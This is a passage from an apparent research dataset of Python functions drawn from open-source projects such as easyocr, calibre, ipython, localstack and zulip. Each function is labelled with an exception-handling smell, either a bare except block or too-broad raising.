                            type
                        ),
                        ui_log=ui_log
                    )

                    if start_time != end_time:
                        __data = QA_fetch_get_index_min(
                            str(code),
                            start_time,
                            end_time,
                            type
                        )
                        if len(__data) > 1:
                            coll.insert_many(
                                QA_util_to_json_from_pandas(__data)
                            )
        except:
            err.append(code)",Bare Except Catch Block,1
47,photon,/home/r4ph/desenv/phd/exception-miner/projects/py/photon/core/utils.py,regxy,"def regxy(pattern, response, supress_regex, custom):
    """"""Extract a string based on regex pattern supplied by user.""""""
    try:
        matches = re.findall(r'%s' % pattern, response)
        for match in matches:
            verb('Custom regex', match)
            custom.add(match)
    except:
        supress_regex = True",Bare Except Catch Block,1
48,easyocr,/home/r4ph/desenv/exception-miner/projects/py/easyocr/easyocr/craft_utils.py,getPoly_core,"def getPoly_core(boxes, labels, mapper, linkmap):
    # configs
    num_cp = 5
    max_len_ratio = 0.7
    expand_ratio = 1.45
    max_r = 2.0
    step_r = 0.2

    polys = []  
    for k, box in enumerate(boxes):
        # size filter for small instance
        w, h = int(np.linalg.norm(box[0] - box[1]) + 1), int(np.linalg.norm(box[1] - box[2]) + 1)
        if w < 10 or h < 10:
            polys.append(None); continue

        # warp image
        tar = np.float32([[0,0],[w,0],[w,h],[0,h]])
        M = cv2.getPerspectiveTransform(box, tar)
        word_label = cv2.warpPerspective(labels, M, (w, h), flags=cv2.INTER_NEAREST)
        try:
            Minv = np.linalg.inv(M)
        except:
            polys.append(None); continue

        # binarization for selected label
        cur_label = mapper[k]
        word_label[word_label != cur_label] = 0
        word_label[word_label > 0] = 1

        """""" Polygon generation """"""
        # find top/bottom contours
        cp = []
        max_len = -1
        for i in range(w):
            region = np.where(word_label[:,i] != 0)[0]
            if len(region) < 2 : continue
            cp.append((i, region[0], region[-1]))
            length = region[-1] - region[0] + 1
            if length > max_len: max_len = length

        # pass if max_len is similar to h
        if h * max_len_ratio < max_len:
            polys.append(None); continue

        # get pivot points with fixed length
        tot_seg = num_cp * 2 + 1
        seg_w = w / tot_seg     # segment width
        pp = [None] * num_cp    # init pivot points
        cp_section = [[0, 0]] * tot_seg
        seg_height = [0] * num_cp
        seg_num = 0
        num_sec = 0
        prev_h = -1
        for i in range(0,len(cp)):
            (x, sy, ey) = cp[i]
            if (seg_num + 1) * seg_w <= x and seg_num <= tot_seg:
                # average previous segment
                if num_sec == 0: break
                cp_section[seg_num] = [cp_section[seg_num][0] / num_sec, cp_section[seg_num][1] / num_sec]
                num_sec = 0

                # reset variables
                seg_num += 1
                prev_h = -1

            # accumulate center points
            cy = (sy + ey) * 0.5
            cur_h = ey - sy + 1
            cp_section[seg_num] = [cp_section[seg_num][0] + x, cp_section[seg_num][1] + cy]
            num_sec += 1

            if seg_num % 2 == 0: continue # No polygon area

            if prev_h < cur_h:
                pp[int((seg_num - 1)/2)] = (x, cy)
                seg_height[int((seg_num - 1)/2)] = cur_h
                prev_h = cur_h

        # processing last segment
        if num_sec != 0:
            cp_section[-1] = [cp_section[-1][0] / num_sec, cp_section[-1][1] / num_sec]

        # pass if num of pivots is not sufficient or segment width is smaller than character height 
        if None in pp or seg_w < np.max(seg_height) * 0.25:
            polys.append(None); continue

        # calc median maximum of pivot points
        half_char_h = np.median(seg_height) * expand_ratio / 2

        # calc gradiant and apply to make horizontal pivots
        new_pp = []
        for i, (x, cy) in enumerate(pp):
            dx = cp_section[i * 2 + 2][0] - cp_section[i * 2][0]
            dy = cp_section[i * 2 + 2][1] - cp_section[i * 2][1]
            if dx == 0:     # gradient if zero
                new_pp.append([x, cy - half_char_h, x, cy + half_char_h])
                continue
            rad = - math.atan2(dy, dx)
            c, s = half_char_h * math.cos(rad), half_char_h * math.sin(rad)
            new_pp.append([x - s, cy - c, x + s, cy + c])

        # get edge points to cover character heatmaps
        isSppFound, isEppFound = False, False
        grad_s = (pp[1][1] - pp[0][1]) / (pp[1][0] - pp[0][0]) + (pp[2][1] - pp[1][1]) / (pp[2][0] - pp[1][0])
        grad_e = (pp[-2][1] - pp[-1][1]) / (pp[-2][0] - pp[-1][0]) + (pp[-3][1] - pp[-2][1]) / (pp[-3][0] - pp[-2][0])
        for r in np.arange(0.5, max_r, step_r):
            dx = 2 * half_char_h * r
            if not isSppFound:
                line_img = np.zeros(word_label.shape, dtype=np.uint8)
                dy = grad_s * dx
                p = np.array(new_pp[0]) - np.array([dx, dy, dx, dy])
                cv2.line(line_img, (int(p[0]), int(p[1])), (int(p[2]), int(p[3])), 1, thickness=1)
                if np.sum(np.logical_and(word_label, line_img)) == 0 or r + 2 * step_r >= max_r:
                    spp = p
                    isSppFound = True
            if not isEppFound:
                line_img = np.zeros(word_label.shape, dtype=np.uint8)
                dy = grad_e * dx
                p = np.array(new_pp[-1]) + np.array([dx, dy, dx, dy])
                cv2.line(line_img, (int(p[0]), int(p[1])), (int(p[2]), int(p[3])), 1, thickness=1)
                if np.sum(np.logical_and(word_label, line_img)) == 0 or r + 2 * step_r >= max_r:
                    epp = p
                    isEppFound = True
            if isSppFound and isEppFound:
                break

        # pass if boundary of polygon is not found
        if not (isSppFound and isEppFound):
            polys.append(None); continue

        # make final polygon
        poly = []
        poly.append(warpCoord(Minv, (spp[0], spp[1])))
        for p in new_pp:
            poly.append(warpCoord(Minv, (p[0], p[1])))
        poly.append(warpCoord(Minv, (epp[0], epp[1])))
        poly.append(warpCoord(Minv, (epp[2], epp[3])))
        for p in reversed(new_pp):
            poly.append(warpCoord(Minv, (p[2], p[3])))
        poly.append(warpCoord(Minv, (spp[2], spp[3])))

        # add to final result
        polys.append(np.array(poly))

    return polys",Bare Except Catch Block,1
49,impacket,/home/r4ph/desenv/phd/exception-miner/projects/py/impacket/examples/kintercept.py,handle_accept,"def handle_accept(self):
        conn, addr = self.accept()
        downstream, upstream = self.intercept_conns(conn)
        downstream.peer = upstream
        upstream.peer = downstream
        try:
            upstream.create_socket(socket.AF_INET, socket.SOCK_STREAM)
            upstream.connect(self.target)
            print ('accepted downconn fd: ' + str(downstream.fileno()))
            print ('established upconn fd: ' + str(upstream.fileno()))
        except:
            print (str(conn.fileno()) + ': failed to connect to target')
            downstream.handle_close()",Bare Except Catch Block,1
50,xx-net,/home/r4ph/desenv/exception-miner/projects/py/xx-net/code/default/lib/noarch/simple_http_server.py,parse_request,"def parse_request(self):
        try:
            self.raw_requestline = self.rfile.readline(65537)
        except:
            raise GetReqTimeout()

        if not self.raw_requestline:
            raise GetReqTimeout()

        if len(self.raw_requestline) > 65536:
            raise ParseReqFail(""Recv command line too large"")

        if self.raw_requestline[0] == '\x16':
            raise socket.error

        self.command = b''  # set in case of error on the first line
        self.path = b''
        self.request_version = version = self.default_request_version

        requestline = self.raw_requestline
        requestline = requestline.rstrip(b'\r\n')
        self.requestline = requestline
        words = requestline.split()
        if len(words) == 3:
            command, path, version = words
            if version[:5] != b'HTTP/':
                raise ParseReqFail(""Req command format fail:%s"" % requestline)

            try:
                base_version_number = version.split(b'/', 1)[1]
                version_number = base_version_number.split(b""."")
                # RFC 2145 section 3.1 says there can be only one ""."" and
                #   - major and minor numbers MUST be treated as
                #      separate integers;
                #   - HTTP/2.4 is a lower version than HTTP/2.13, which in
                #      turn is lower than HTTP/12.3;
                #   - Leading zeros MUST be ignored by recipients.
                if len(version_number) != 2:
                    raise ParseReqFail(""Req command format fail:%s"" % requestline)
                version_number = int(version_number[0]), int(version_number[1])
            except (ValueError, IndexError):
                raise ParseReqFail(""Req command format fail:%s"" % requestline)
            if version_number >= (1, 1):
                self.close_connection = 0
            if version_number >= (2, 0):
                raise ParseReqFail(""Req command format fail:%s"" % requestline)
        elif len(words) == 2:
            command, path = words
            self.close_connection = 1
            if command != b'GET':
                raise ParseReqFail(""Req command format HTTP/0.9 line:%s"" % requestline)
        elif not words:
            raise ParseReqFail(""Req command format fail:%s"" % requestline)
        else:
            raise ParseReqFail(""Req command format fail:%s"" % requestline)
        self.command, self.path, self.request_version = command, path, version

        # Parse HTTP headers
        self.headers = self.parse_headers()

        self.host = self.headers.get(b'Host', b"""")
        conntype = self.headers.get(b'Connection', b"""")
        if conntype.lower() == b'close':
            self.close_connection = 1
        elif conntype.lower() == b'keep-alive':
            self.close_connection = 0

        self.upgrade = self.headers.get(b'Upgrade', b"""").lower()

        return True",Bare Except Catch Block,1
51,dgl,/home/r4ph/desenv/phd/exception-miner/projects/py/dgl/examples/pytorch/ogb/deepwalk/utils.py,sum_up_params,"def sum_up_params(model):
    """"""Count the model parameters""""""
    n = []
    n.append(model.u_embeddings.weight.cpu().data.numel() * 2)
    n.append(model.lookup_table.cpu().numel())
    n.append(model.index_emb_posu.cpu().numel() * 2)
    n.append(model.grad_u.cpu().numel() * 2)

    try:
        n.append(model.index_emb_negu.cpu().numel() * 2)
    except:
        pass
    try:
        n.append(model.state_sum_u.cpu().numel() * 2)
    except:
        pass
    try:
        n.append(model.grad_avg.cpu().numel())
    except:
        pass
    try:
        n.append(model.context_weight.cpu().numel())
    except:
        pass

    print(""#params "" + str(sum(n)))
    exit()",Bare Except Catch Block,1
52,calibre,/home/r4ph/desenv/phd/exception-miner/projects/py/calibre/src/calibre/gui2/tag_browser/model.py,_get_category_nodes,"def _get_category_nodes(self, sort):
        '''
        Called by __init__. Do not directly call this method.
        '''
        self.row_map = []
        self.categories = OrderedDict()

        # Get the categories
        try:
            # We must disable the in_tag_browser ids because we want all the
            # categories that will be filtered later. They might be restricted
            # by a VL or extra restriction.
            old_in_tb = self.db.data.get_in_tag_browser()
            self.db.data.set_in_tag_browser(None)
            data = self.db.new_api.get_categories(sort=sort,
                    book_ids=self.get_book_ids_to_use(),
                    first_letter_sort=self.collapse_model == 'first letter')
            self.db.data.set_in_tag_browser(old_in_tb)
        except Exception as e:
            traceback.print_exc()
            data = self.db.new_api.get_categories(sort=sort,
                    first_letter_sort=self.collapse_model == 'first letter')
            self.restriction_error.emit(str(e))

        if self.filter_categories_by:
            if self.filter_categories_by.startswith('='):
                use_exact_match = True
                filter_by = self.filter_categories_by[1:]
            else:
                use_exact_match = False
                filter_by = self.filter_categories_by

            if prefs['use_primary_find_in_search']:
                def final_equals(x, y):
                    return primary_strcmp(x, y) == 0
                def final_contains(x, y):
                    return primary_contains(x, y)
            else:
                def final_equals(x, y):
                    return strcmp(x, y) == 0
                def final_contains(filt, txt):
                    return contains(filt, icu_lower(txt))

            for category in data.keys():
                if use_exact_match:
                    data[category] = [t for t in data[category]
                        if final_equals(t.name, filter_by)]
                else:
                    data[category] = [t for t in data[category]
                        if final_contains(filter_by, t.name)]

        # Build a dict of the keys that have data.
        # Always add user categories so that the constructed hierarchy works.
        # This means that empty categories will be displayed unless the 'hide
        # empty categories' box is checked.
        tb_categories = self.db.field_metadata
        for category in tb_categories:
            if category in data or category.startswith('@'):
                self.categories[category] = tb_categories[category]['name']

        # Now build the list of fields in display order. A lot of this is to
        # maintain compatibility with the tweaks.
        order_pref = self.db.new_api.pref('tag_browser_category_order', None)
        if order_pref is not None:
            # Keys are in order
            self.row_map = self.get_ordered_categories()
        else:
            order = tweaks.get('tag_browser_category_default_sort', 'default')
            self.row_map = list(self.categories.keys())
            if order not in ('default', 'display_name', 'lookup_name'):
                print('Tweak tag_browser_category_default_sort is not valid. Ignored')
                order = 'default'
            if order != 'default':
                def key_func(val):
                    if order == 'display_name':
                        return icu_lower(self.db.field_metadata[val]['name'])
                    return icu_lower(val[1:] if val.startswith('#') or val.startswith('@') else val)
                direction = tweaks.get('tag_browser_category_default_sort_direction', 'ascending')
                if direction not in ('ascending', 'descending'):
                    print('Tweak tag_browser_category_default_sort_direction is not valid. Ignored')
                    direction = 'ascending'
                self.row_map.sort(key=key_func, reverse=direction == 'descending')
                try:
                    order = tweaks.get('tag_browser_category_order', {'*':1})
                    if not isinstance(order, dict):
                        raise TypeError()
                except:
                    print('Tweak tag_browser_category_order is not valid. Ignored')
                    order = {'*': 1000}
                defvalue = order.get('*', 1000)
                self.row_map.sort(key=lambda x: order.get(x, defvalue))
            # Migrate the tweak to the new pref. First, make sure the order is valid
            self.row_map = self.get_ordered_categories(pref_data_override=[[k,None] for k in self.row_map])
            self.db.new_api.set_pref('tag_browser_category_order', self.row_map)
        return data",Bare Except Catch Block,1
53,dash,/home/r4ph/desenv/exception-miner/projects/py/dash/dash/_get_app.py,get_app,"def get_app():
    if APP is None:
        raise Exception(
            dedent(
                """"""
                App object is not yet defined.  `app = dash.Dash()` needs to be run
                before `dash.get_app()` is called and can only be used within apps that use
                the `pages` multi-page app feature: `dash.Dash(use_pages=True)`.

                `dash.get_app()` is used to get around circular import issues when Python files
                within the pages/` folder need to reference the `app` object.
                """"""
            )
        )
    return APP",Too Broad Raising,1
54,ipython,/home/r4ph/desenv/exception-miner/projects/py/ipython/IPython/core/magics/execution.py,run,"def run(self, parameter_s='', runner=None,
                  file_finder=get_py_filename):
        """"""Run the named file inside IPython as a program.

        Usage::

          %run [-n -i -e -G]
               [( -t [-N<N>] | -d [-b<N>] | -p [profile options] )]
               ( -m mod | filename ) [args]

        The filename argument should be either a pure Python script (with
        extension ``.py``), or a file with custom IPython syntax (such as
        magics). If the latter, the file can be either a script with ``.ipy``
        extension, or a Jupyter notebook with ``.ipynb`` extension. When running
        a Jupyter notebook, the output from print statements and other
        displayed objects will appear in the terminal (even matplotlib figures
        will open, if a terminal-compliant backend is being used). Note that,
        at the system command line, the ``jupyter run`` command offers similar
        functionality for executing notebooks (albeit currently with some
        differences in supported options).

        Parameters after the filename are passed as command-line arguments to
        the program (put in sys.argv). Then, control returns to IPython's
        prompt.

        This is similar to running at a system prompt ``python file args``,
        but with the advantage of giving you IPython's tracebacks, and of
        loading all variables into your interactive namespace for further use
        (unless -p is used, see below).

        The file is executed in a namespace initially consisting only of
        ``__name__=='__main__'`` and sys.argv constructed as indicated. It thus
        sees its environment as if it were being run as a stand-alone program
        (except for sharing global objects such as previously imported
        modules). But after execution, the IPython interactive namespace gets
        updated with all variables defined in the program (except for __name__
        and sys.argv). This allows for very convenient loading of code for
        interactive work, while giving each program a 'clean sheet' to run in.

        Arguments are expanded using shell-like glob match.  Patterns
        '*', '?', '[seq]' and '[!seq]' can be used.  Additionally,
        tilde '~' will be expanded into user's home directory.  Unlike
        real shells, quotation does not suppress expansions.  Use
        *two* back slashes (e.g. ``\\\\*``) to suppress expansions.
        To completely disable these expansions, you can use -G flag.

        On Windows systems, the use of single quotes `'` when specifying
        a file is not supported. Use double quotes `""`.

        Options:

        -n
          __name__ is NOT set to '__main__', but to the running file's name
          without extension (as python does under import).  This allows running
          scripts and reloading the definitions in them without calling code
          protected by an ``if __name__ == ""__main__""`` clause.

        -i
          run the file in IPython's namespace instead of an empty one. This
          is useful if you are experimenting with code written in a text editor
          which depends on variables defined interactively.

        -e
          ignore sys.exit() calls or SystemExit exceptions in the script
          being run.  This is particularly useful if IPython is being used to
          run unittests, which always exit with a sys.exit() call.  In such
          cases you are interested in the output of the test results, not in
          seeing a traceback of the unittest module.

        -t
          print timing information at the end of the run.  IPython will give
          you an estimated CPU time consumption for your script, which under
          Unix uses the resource module to avoid the wraparound problems of
          time.clock().  Under Unix, an estimate of time spent on system tasks
          is also given (for Windows platforms this is reported as 0.0).

        If -t is given, an additional ``-N<N>`` option can be given, where <N>
        must be an integer indicating how many times you want the script to
        run.  The final timing report will include total and per run results.

        For example (testing the script uniq_stable.py)::

            In [1]: run -t uniq_stable

            IPython CPU timings (estimated):
              User  :    0.19597 s.
              System:        0.0 s.

            In [2]: run -t -N5 uniq_stable

            IPython CPU timings (estimated):
            Total runs performed: 5
              Times :      Total       Per run
              User  :   0.910862 s,  0.1821724 s.
              System:        0.0 s,        0.0 s.

        -d
          run your program under the control of pdb, the Python debugger.
          This allows you to execute your program step by step, watch variables,
          etc.  Internally, what IPython does is similar to calling::

              pdb.run('execfile(""YOURFILENAME"")')

          with a breakpoint set on line 1 of your file.  You can change the line
          number for this automatic breakpoint to be <N> by using the -bN option
          (where N must be an integer). For example::

              %run -d -b40 myscript

          will set the first breakpoint at line 40 in myscript.py.  Note that
          the first breakpoint must be set on a line which actually does
          something (not a comment or docstring) for it to stop execution.

          Or you can specify a breakpoint in a different file::

              %run -d -b myotherfile.py:20 myscript

          When the pdb debugger starts, you will see a (Pdb) prompt.  You must
          first enter 'c' (without quotes) to start execution up to the first
          breakpoint.

          Entering 'help' gives information about the use of the debugger.  You
          can easily see pdb's full documentation with ""import pdb;pdb.help()""
          at a prompt.

        -p
          run program under the control of the Python profiler module (which
          prints a detailed report of execution times, function calls, etc).

          You can pass other options after -p which affect the behavior of the
          profiler itself. See the docs for %prun for details.

          In this mode, the program's variables do NOT propagate back to the
          IPython interactive namespace (because they remain in the namespace
          where the profiler executes them).

          Internally this triggers a call to %prun, see its documentation for
          details on the options available specifically for profiling.

        There is one special usage for which the text above doesn't apply:
        if the filename ends with .ipy[nb], the file is run as ipython script,
        just as if the commands were written on IPython prompt.

        -m
          specify module name to load instead of script path. Similar to
          the -m option for the python interpreter. Use this option last if you
          want to combine with other %run options. Unlike the python interpreter
          only source modules are allowed no .pyc or .pyo files.
          For example::

              %run -m example

          will run the example module.

        -G
          disable shell-like glob expansion of arguments.

        """"""

        # Logic to handle issue #3664
        # Add '--' after '-m <module_name>' to ignore additional args passed to a module.
        if '-m' in parameter_s and '--' not in parameter_s:
            argv = shlex.split(parameter_s, posix=(os.name == 'posix'))
            for idx, arg in enumerate(argv):
                if arg and arg.startswith('-') and arg != '-':
                    if arg == '-m':
                        argv.insert(idx + 2, '--')
                        break
                else:
                    # Positional arg, break
                    break
            parameter_s = ' '.join(shlex.quote(arg) for arg in argv)

        # get arguments and set sys.argv for program to be run.
        opts, arg_lst = self.parse_options(parameter_s,
                                           'nidtN:b:pD:l:rs:T:em:G',
                                           mode='list', list_all=1)
        if ""m"" in opts:
            modulename = opts[""m""][0]
            modpath = find_mod(modulename)
            if modpath is None:
                msg = '%r is not a valid modulename on sys.path'%modulename
                raise Exception(msg)
            arg_lst = [modpath] + arg_lst
        try:
            fpath = None # initialize to make sure fpath is in scope later
            fpath = arg_lst[0]
            filename = file_finder(fpath)
        except IndexError as e:
            msg = 'you must provide at least a filename.'
            raise Exception(msg) from e
        except IOError as e:
            try:
                msg = str(e)
            except UnicodeError:
                msg = e.message
            if os.name == 'nt' and re.match(r""^'.*'$"",fpath):
                warn('For Windows, use double quotes to wrap a filename: %run ""mypath\\myfile.py""')
            raise Exception(msg) from e
        except TypeError:
            if fpath in sys.meta_path:
                filename = """"
            else:
                raise

        if filename.lower().endswith(('.ipy', '.ipynb')):
            with preserve_keys(self.shell.user_ns, '__file__'):
                self.shell.user_ns['__file__'] = filename
                self.shell.safe_execfile_ipy(filename, raise_exceptions=True)
            return

        # Control the response to exit() calls made by the script being run
        exit_ignore = 'e' in opts

        # Make sure that the running script gets a proper sys.argv as if it
        # were run from a system shell.
        save_argv = sys.argv # save it for later restoring

        if 'G' in opts:
            args = arg_lst[1:]
        else:
            # tilde and glob expansion
            args = shellglob(map(os.path.expanduser,  arg_lst[1:]))

        sys.argv = [filename] + args  # put in the proper filename

        if 'n' in opts:
            name = Path(filename).stem
        else:
            name = '__main__'

        if 'i' in opts:
            # Run in user's interactive namespace
            prog_ns = self.shell.user_ns
            __name__save = self.shell.user_ns['__name__']
            prog_ns['__name__'] = name
            main_mod = self.shell.user_module

            # Since '%run foo' emulates 'python foo.py' at the cmd line, we must
            # set the __file__ global in the script's namespace
            # TK: Is this necessary in interactive mode?
            prog_ns['__file__'] = filename
        else:
            # Run in a fresh, empty namespace

            # The shell MUST hold a reference to prog_ns so after %run
            # exits, the python deletion mechanism doesn't zero it out
            # (leaving dangling references). See interactiveshell for details
            main_mod = self.shell.new_main_mod(filename, name)
            prog_ns = main_mod.__dict__

        # pickle fix.  See interactiveshell for an explanation.  But we need to
        # make sure that, if we overwrite __main__, we replace it at the end
        main_mod_name = prog_ns['__name__']

        if main_mod_name == '__main__':
            restore_main = sys.modules['__main__']
        else:
            restore_main = False

        # This needs to be undone at the end to prevent holding references to
        # every single object ever created.
        sys.modules[main_mod_name] = main_mod

        if 'p' in opts or 'd' in opts:
            if 'm' in opts:
                code = 'run_module(modulename, prog_ns)'
                code_ns = {
                    'run_module': self.shell.safe_run_module,
                    'prog_ns': prog_ns,
                    'modulename': modulename,
                }
            else:
                if 'd' in opts:
                    # allow exceptions to raise in debug mode
                    code = 'execfile(filename, prog_ns, raise_exceptions=True)'
                else:
                    code = 'execfile(filename, prog_ns)'
                code_ns = {
                    'execfile': self.shell.safe_execfile,
                    'prog_ns': prog_ns,
                    'filename': get_py_filename(filename),
                }

        try:
            stats = None
            if 'p' in opts:
                stats = self._run_with_profiler(code, opts, code_ns)
            else:
                if 'd' in opts:
                    bp_file, bp_line = parse_breakpoint(
                        opts.get('b', ['1'])[0], filename)
                    self._run_with_debugger(
                        code, code_ns, filename, bp_line, bp_file)
                else:
                    if 'm' in opts:
                        def run():
                            self.shell.safe_run_module(modulename, prog_ns)
                    else:
                        if runner is None:
                            runner = self.default_runner
                        if runner is None:
                            runner = self.shell.safe_execfile

                        def run():
                            runner(filename, prog_ns, prog_ns,
                                    exit_ignore=exit_ignore)

                    if 't' in opts:
                        # timed execution
                        try:
                            nruns = int(opts['N'][0])
                            if nruns < 1:
                                error('Number of runs must be >=1')
                                return
                        except (KeyError):
                            nruns = 1
                        self._run_with_timing(run, nruns)
                    else:
                        # regular execution
                        run()

            if 'i' in opts:
                self.shell.user_ns['__name__'] = __name__save
            else:
                # update IPython interactive namespace

                # Some forms of read errors on the file may mean the
                # __name__ key was never set; using pop we don't have to
                # worry about a possible KeyError.
                prog_ns.pop('__name__', None)

                with preserve_keys(self.shell.user_ns, '__file__'):
                    self.shell.user_ns.update(prog_ns)
        finally:
            # It's a bit of a mystery why, but __builtins__ can change from
            # being a module to becoming a dict missing some key data after
            # %run.  As best I can see, this is NOT something IPython is doing
            # at all, and similar problems have been reported before:
            # http://coding.derkeiler.com/Archive/Python/comp.lang.python/2004-10/0188.html
            # Since this seems to be done by the interpreter itself, the best
            # we can do is to at least restore __builtins__ for the user on
            # exit.
            self.shell.user_ns['__builtins__'] = builtin_mod

            # Ensure key global structures are restored
            sys.argv = save_argv
            if restore_main:
                sys.modules['__main__'] = restore_main
                if '__mp_main__' in sys.modules:
                    sys.modules['__mp_main__'] = restore_main
            else:
                # Remove from sys.modules the reference to main_mod we'd
                # added.  Otherwise it will trap references to objects
                # contained therein.
                del sys.modules[main_mod_name]

        return stats",Too Broad Raising,1
55,localstack,/home/r4ph/desenv/exception-miner/projects/py/localstack/localstack/services/cloudformation/engine/template_deployer.py,extract_resource_attribute,"def extract_resource_attribute(
    resource_type,
    resource_state,
    attribute,
    resource_id=None,
    resource=None,
    stack=None,
):
    LOG.debug(""Extract resource attribute: %s %s"", resource_type, attribute)
    is_ref_attribute = attribute in [""PhysicalResourceId"", ""Ref""]
    is_ref_attr_or_arn = is_ref_attribute or attribute == ""Arn""
    resource = resource or {}
    if not resource and stack.resources:
        resource = stack.resources[resource_id]

    if not resource_state:
        resource_state = retrieve_resource_details(resource_id, {}, stack=stack)
        if not resource_state:
            raise DependencyNotYetSatisfied(
                resource_ids=resource_id,
                message=f'Unable to fetch details for resource ""{resource_id}"" (attribute ""{attribute}"")',
            )

    if isinstance(resource_state, GenericBaseModel):
        if hasattr(resource_state, ""get_cfn_attribute""):
            try:
                return resource_state.get_cfn_attribute(attribute)
            except Exception:
                pass
        raise Exception(
            f'Unable to extract attribute ""{attribute}"" from ""{resource_type}"" model class {type(resource_state)}'
        )

    # extract resource specific attributes
    # TODO: remove the code below - move into resource model classes!

    resource_props = resource.get(""Properties"", {})
    if resource_type == ""Parameter"":
        result = None
        param_value = resource_props.get(
            ""Value"",
            resource.get(""Value"", resource_props.get(""Properties"", {}).get(""Value"")),
        )
        param_value_type = resource_props.get(""ParameterType"") or """"
        if param_value_type.startswith(""AWS::SSM::Parameter::Value""):
            param_value = resolve_ssm_parameter_value(
                param_value_type, resource_props.get(""ParameterValue"")
            )
        if is_ref_attr_or_arn:
            result = param_value
        elif isinstance(param_value, dict):
            result = param_value.get(attribute)
        if result is not None:
            return result
        return """"
    attribute_lower = first_char_to_lower(attribute)
    result = resource_state.get(attribute) or resource_state.get(attribute_lower)
    if result is None and isinstance(resource, dict):
        result = resource_props.get(attribute) or resource_props.get(attribute_lower)
        if result is None:
            result = get_attr_from_model_instance(
                resource,
                attribute,
                resource_type=resource_type,
                resource_id=resource_id,
            )
    if is_ref_attribute:
        for attr in [""Id"", ""PhysicalResourceId"", ""Ref""]:
            if result is None:
                for obj in [resource_state, resource]:
                    result = result or obj.get(attr)
    return result",Too Broad Raising,1
56,mindsdb,/home/r4ph/desenv/phd/exception-miner/projects/py/mindsdb/mindsdb/integrations/handlers/langchain_handler/langchain_handler.py,_get_serper_api_key,"def _get_serper_api_key(self, args, strict=True):
        if 'serper_api_key' in args:
            return args['serper_api_key']
        # 2
        connection_args = self.engine_storage.get_connection_args()
        if 'serper_api_key' in connection_args:
            return connection_args['serper_api_key']
        # 3
        api_key = os.getenv('SERPER_API_KEY')  # e.g. ""OPENAI_API_KEY""
        if api_key is not None:
            return api_key

        if strict:
            raise Exception(f'Missing API key serper_api_key. Either re-create this ML_ENGINE specifying the `serper_api_key` parameter,\
                 or re-create this model and pass the API key with `USING` syntax.')",Too Broad Raising,1
57,fail2ban,/home/r4ph/desenv/phd/exception-miner/projects/py/fail2ban/fail2ban/tests/files/action.d/action_errors.py,unban,"def unban(self):
        raise Exception()",Too Broad Raising,1
58,zulip,/home/r4ph/desenv/exception-miner/projects/py/zulip/zerver/lib/test_classes.py,make_stream,"def make_stream(
        self,
        stream_name: str,
        realm: Optional[Realm] = None,
        invite_only: bool = False,
        is_web_public: bool = False,
        history_public_to_subscribers: Optional[bool] = None,
    ) -> Stream:
        if realm is None:
            realm = get_realm(""zulip"")

        history_public_to_subscribers = get_default_value_for_history_public_to_subscribers(
            realm, invite_only, history_public_to_subscribers
        )
        administrators_user_group = UserGroup.objects.get(
            name=UserGroup.ADMINISTRATORS_GROUP_NAME, realm=realm, is_system_group=True
        )

        try:
            stream = Stream.objects.create(
                realm=realm,
                name=stream_name,
                invite_only=invite_only,
                is_web_public=is_web_public,
                history_public_to_subscribers=history_public_to_subscribers,
                can_remove_subscribers_group=administrators_user_group,
            )
        except IntegrityError:  # nocoverage -- this is for bugs in the tests
            raise Exception(
                f""""""
                {stream_name} already exists

                Please call make_stream with a stream name
                that is not already in use.""""""
            )

        recipient = Recipient.objects.create(type_id=stream.id, type=Recipient.STREAM)
        stream.recipient = recipient
        stream.save(update_fields=[""recipient""])
        return stream",Too Broad Raising,1
59,inter,/home/r4ph/desenv/exception-miner/projects/py/inter/misc/tools/fixup-features.py,main,"def main():
  argparser = ArgumentParser(description='Fixup features.fea')

  argparser.add_argument(
    '-dry', dest='dryRun', action='store_const', const=True, default=False,
    help='Do not modify anything, but instead just print what would happen.')

  argparser.add_argument(
    'fontPaths', metavar='<ufofile>', type=str, nargs='+', help='UFO fonts to update')

  args = argparser.parse_args()
  dryRun = args.dryRun

  agl = loadAGL('src/glyphlist.txt') # { 2126: 'Omega', ... }
  diacriticComps = loadGlyphCompositions('src/diacritics.txt') # {glyphName => (baseName, a, o)}

  # collect glyph names
  fonts = [OpenFont(fontPath) for fontPath in args.fontPaths]
  uc2names, name2ucs, allNames = loadLocalNamesDB(fonts, agl, diacriticComps)

  includeRe = re.compile(r'^include\(([^\)]+)\);\s*$')

  # open features.fea
  featuresLines = loadFeaturesFile(os.path.join(fontPath, 'features.fea'))

  classDefRe = re.compile(r'^@([^\s=]+)\s*=\s*\[([^\]]+)\]\s*;\s*$')
  subRe = re.compile(r'^\s*sub\s+(.+)(\'?)\s+by\s+(.+)\s*;\s*$')
  sub2Re = re.compile(r'^\s*sub\s+([^\[]+)\s+\[\s*([^\]]+)\s*\](\'?)\s+by\s+(.+)\s*;\s*$')
  # sub lmidtilde [uni1ABB uni1ABD uni1ABE]' by uni1ABE.w2;
  # sub lmidtilde uni1ABC' by uni1ABC.w2;
  spacesRe = re.compile(r'[\s\r\n]+')

  classDefs = {}
  featuresLines2 = []

  for line in featuresLines:
    clsM = classDefRe.match(line)
    if clsM is not None:
      clsName = clsM.group(1)
      names = spacesRe.split(clsM.group(2).strip())
      if clsName in classDefs:
        raise Exception('duplicate class definition ' + clsName)
      # print('classdef', clsName, ' '.join(names))
      # print('classdef', clsName)
      names2 = []
      for name in names:
        if name == '-':
          # e.g. A - Z
          names2.append(name)
          continue
        if name[0] != '@':
          canonName = canonicalGlyphName(name, uc2names)
          if canonName != name:
            # print('renaming ' + name + ' -> ' + canonName)
            names2.append(canonName)
          elif name not in allNames:
            print('skipping unknown glyph ' + name)
          else:
            names2.append(name)
        else:
          raise Exception('todo: class-ref ' + name + ' in class-def ' + clsName)
      classDefs[clsName] = names2
      line = '@%s = [ %s ];' % (clsName, ' '.join(names2))
      featuresLines2.append(line)
      continue


    # sub2M = sub2Re.match(line)
    # if sub2M is not None:
    #   findNames1 = spacesRe.split(sub2M.group(1))
    #   findNames2 = spacesRe.split(sub2M.group(2))
    #   apos = sub2M.group(3)
    #   rightName = sub2M.group(4)
    #   print('TODO: sub2', findNames1, findNames2, apos, rightName)
    #   featuresLines2.append(line)
    #   continue


    sub2M = sub2Re.match(line)
    subM = None
    if sub2M is None:
      subM = subRe.match(line)
    if subM is not None or sub2M is not None:
      findNamesStr = ''
      findNamesHasBrackets = False
      findNames = []

      findNamesBStr = ''
      findNamesBHasBrackets = False
      findNamesB = []

      newNamesStr = ''
      newNamesHasBrackets = False
      newNames = []

      apos0 = ''

      if subM is not None:
        findNamesStr = subM.group(1)        
        apos0 = subM.group(2)
